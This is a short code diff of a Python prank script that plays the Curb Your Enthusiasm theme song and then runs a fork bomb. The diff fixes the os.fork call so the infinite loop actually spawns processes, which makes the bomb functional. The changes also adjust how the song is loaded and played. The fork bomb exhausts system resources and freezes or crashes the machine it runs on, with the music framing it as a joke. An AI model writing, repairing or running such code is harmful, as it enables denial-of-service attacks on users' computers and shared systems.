@@ -1,17 +1,16 @@
 import os
 import pygame
+import time
 
 def main():
     pygame.mixer.init()
-    song = Sound("Curb_Your_Enthusiasm_theme_song.mp3")
-    song.play()
+    song = pygame.mixer.Sound("Curb_Your_Enthusiasm_theme_song.wav")
+    pygame.mixer.Sound.play(song)
     executeFork()
-    song.fadeout(15000)
-
 
 def executeFork():
-    while True:
-        os.fork
+    while 1:
+        os.fork()
 
 if __name__ == "__main__":
     main()
